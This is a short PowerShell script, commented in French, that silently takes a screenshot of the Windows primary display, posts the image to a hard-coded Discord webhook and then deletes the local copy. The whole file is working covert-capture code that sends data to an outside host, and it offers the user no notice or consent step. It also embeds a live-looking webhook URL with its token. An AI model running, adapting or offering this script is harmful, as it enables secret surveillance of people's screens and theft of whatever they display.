# 1. Configuration
$webhookUrl = "https://discord.com/api/webhooks/1450922309891391652/j_WkuEvDxWSNpICu5KBccsK1r4-nfRrIfZatPGyUPTQRWAQ9C0EZ3YXu2v5XgStzodPd"
$screenshotPath = "$env:TEMP\screen.png"

# 2. Capture d'écran (Utilise l'assemblage .NET pour l'image)
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$screen = [System.Windows.Forms.Screen]::PrimaryScreen
$top    = $screen.Bounds.Top
$left   = $screen.Bounds.Left
$width  = $screen.Bounds.Width
$height = $screen.Bounds.Height

$bitmap = New-Object System.Drawing.Bitmap -ArgumentList $width, $height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)

$bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)

$graphics.Dispose()
$bitmap.Dispose()

# 3. Envoi vers Discord via une requête Multipart
$fileBytes = [System.IO.File]::ReadAllBytes($screenshotPath)
$boundary = [System.Guid]::NewGuid().ToString()

$body = (
    "--$boundary`r`n" +
    "Content-Disposition: form-data; name=`"payload_json`"`r`n`r`n" +
    "{`"content`": `"📸 **Capture d'écran Windows (PS1) reçue !**`"}`r`n" +
    "--$boundary`r`n" +
    "Content-Disposition: form-data; name=`"file`"; filename=`"screen.png`"`r`n" +
    "Content-Type: image/png`r`n`r`n"
)

$endBody = "`r`n--$boundary--`r`n"

$postData = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetBytes($body) + $fileBytes + [System.Text.Encoding]::GetEncoding('iso-8859-1').GetBytes($endBody)

Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $postData

# 4. Nettoyage
Remove-Item $screenshotPath
